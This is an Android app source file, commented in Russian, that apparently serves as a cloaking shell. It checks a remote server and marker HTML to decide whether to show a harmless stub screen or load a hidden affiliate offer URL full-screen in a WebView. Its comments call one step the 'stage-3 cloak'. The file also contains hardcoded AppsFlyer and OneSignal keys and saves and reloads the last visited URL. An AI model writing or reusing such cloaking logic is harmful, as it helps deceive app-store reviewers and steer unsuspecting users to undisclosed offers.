package com.kevinus22.kevinus22;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.TargetApi;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.CookieSyncManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;

import com.onesignal.OneSignal;

import java.util.Map;

public class MainActivity extends AppCompatActivity {

    WebView webView;
    WebSettings webSettings;
    static NetworkInfo netInfo;
    Intent intent;
    HttpURLConnectionExample httpURLConnection;
    int otvetservera;

    // SDK Appsflyer Key
    private static final String AF_DEV_KEY = "Mu9BKvMoezdqzbamvNoQgC";
    // Ссылка основного потока (оффера)
    String urlGo = "https://kevinus21.ru/CbBr82Jk";

    // Добавляем переменные для сохранения последней ссылки
    SharedPreferences mSettings;
    public static final String APP_PREFERENCES = "myurl";
    public static final String APP_PREFERENCES_URL = "url";
    SharedPreferences.Editor editor;

    public ValueCallback<Uri[]> uploadMessage;
    private ValueCallback<Uri> mUploadMessage;
    public static final int REQUEST_SELECT_FILE = 100;
    private final static int FILECHOOSER_RESULTCODE = 1;

    // Для OneSignal
    private static final String ONESIGNAL_APP_ID = "9580e3df-a790-4596-a818-837636935d21";



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        // Открываем приложение на весь экран
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        // Enable verbose OneSignal logging to debug issues if needed.
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        // Загружаем последнюю ссылку
        mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);
        if (mSettings.contains(APP_PREFERENCES_URL)) {
            urlGo = mSettings.getString(APP_PREFERENCES_URL, "");
        }

        // Начало кода AppsFlyer
        AppsFlyerConversionListener conversionListener = new AppsFlyerConversionListener() {

            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {

                for (String attrName : conversionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + conversionData.get(attrName));
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
                Log.d("LOG_TAG", "error getting conversion data: " + errorMessage);
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {

                for (String attrName : attributionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + attributionData.get(attrName));
                }

            }

            @Override
            public void onAttributionFailure(String errorMessage) {
                Log.d("LOG_TAG", "error onAttributionFailure : " + errorMessage);
            }
        };

        AppsFlyerLib.getInstance().init(AF_DEV_KEY, conversionListener, this);
        AppsFlyerLib.getInstance().startTracking(this);
        // Конец кода AppsFlyer


        // Вызываем функцию проверки интернета у пользователя
        if (isOnline(this)) {
            // Вызываем функцию открытия WV
            noBot();
        } else {
            // Вызываем функцию перехода на заглушку
            isBot();
        }

    }

    // При клике на кнопку назад - переходим на страницу назад, а не выходим из приложения
    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    // Объявляем функцию проверки интернета у пользователя
    public static boolean isOnline(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        netInfo = cm.getActiveNetworkInfo();
        if (netInfo != null && netInfo.isConnectedOrConnecting()) {
            return true;
        } else {
            return false;
        }
    }

    // Функция перехода на заглушку
    public void isBot() {
        intent = new Intent(this, White.class);
        startActivity(intent);
    }

    // Функция открытия WebView
    public void noBot() {

        httpURLConnection = new HttpURLConnectionExample();
        httpURLConnection.start();
        try {
            // Ожидаем завершения выполнения асинхронного класса
            httpURLConnection.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        otvetservera = httpURLConnection.otvetservera();
        if (otvetservera != 404) {

            webView = (WebView) findViewById(R.id.webview);
            webSettings = webView.getSettings();

            // Разрешаем JavaScript в WebView
            webSettings.setJavaScriptEnabled(true);
            // Разрешаем в WebView хранить Cookie
            webSettings.setDomStorageEnabled(true);
            // Настраиваем корректное отображение экрана
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(false);
            webSettings.setDisplayZoomControls(false);
            webView.setInitialScale(1);
            webView.getSettings().setLoadWithOverviewMode(true);
            webView.getSettings().setUseWideViewPort(true);
            // Настройки для загрузки файлов
            webView.setWebChromeClient(new MyWebChromeClient());
            webView.getSettings().setAllowContentAccess(true);
            webView.getSettings().setAllowFileAccess(true);

            // Задаём ссылку для WebView
            webView.loadUrl(urlGo);

            // Подключаем класс клоаки 3-го этапа
            webView.addJavascriptInterface(new JavaClassEtap(), "HTMLOUT");

            webView.setWebViewClient(new WebViewClient() {
                // Разрешаем переходить по другим ссылкам в WebView
                public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest request) {
                    return false;
                }

                // Устанавливаем куки при закрытии страницы, а не раз в 5 минут
                public void onPageFinished(WebView view, String url) {
                    view.loadUrl("javascript:window.HTMLOUT.showHTML('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
                    CookieSyncManager.getInstance().sync();

                    // Сохраняем последнюю ссылку
                    urlGo = webView.getUrl();
                    editor = mSettings.edit();
                    editor.putString(APP_PREFERENCES_URL, urlGo);
                    editor.apply();
                }
            });
        } else {
            // Иначе показываем заглушку
            isBot();
        }
    }

    class JavaClassEtap {
        @JavascriptInterface
        public void showHTML(String html_data) {
            if (html_data.compareToIgnoreCase("<html><head><style>body{margin:0}</style></head><body><!--welcome_kevinus22_pulsar--></body></html>") == 0) {
                isBot();
            }
        }
    }

    // Начало кода для загрузки файлов
    class MyWebChromeClient extends WebChromeClient {
        // For 3.0+ Devices (Start)
        // onActivityResult attached before constructor
        protected void openFileChooser(ValueCallback uploadMsg, String acceptType) {
            mUploadMessage = uploadMsg;
            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("image/*");
            startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
        }


        // For Lollipop 5.0+ Devices
        @TargetApi(Build.VERSION_CODES.LOLLIPOP)
        public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            if (uploadMessage != null) {
                uploadMessage.onReceiveValue(null);
                uploadMessage = null;
            }

            uploadMessage = filePathCallback;

            Intent intent = fileChooserParams.createIntent();
            try {
                startActivityForResult(intent, REQUEST_SELECT_FILE);
            } catch (ActivityNotFoundException e) {
                uploadMessage = null;
                Toast.makeText(MainActivity.this, "Файл невозможно открыть", Toast.LENGTH_LONG).show();
                return false;
            }
            return true;
        }

        //For Android 4.1 only 19
        protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            mUploadMessage = uploadMsg;
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent, "Выбор файла"), FILECHOOSER_RESULTCODE);
        }

        protected void openFileChooser(ValueCallback<Uri> uploadMsg) {
            mUploadMessage = uploadMsg;
            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("image/*");
            startActivityForResult(Intent.createChooser(i, "Выбор файла"), FILECHOOSER_RESULTCODE);
        }
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uploadMessage == null)
                    return;
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uploadMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUploadMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK only if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        } else {
            Toast.makeText(this, "Failed to Upload Image", Toast.LENGTH_LONG).show();
        }

    }
    // Конец кода для загрузки файлов



}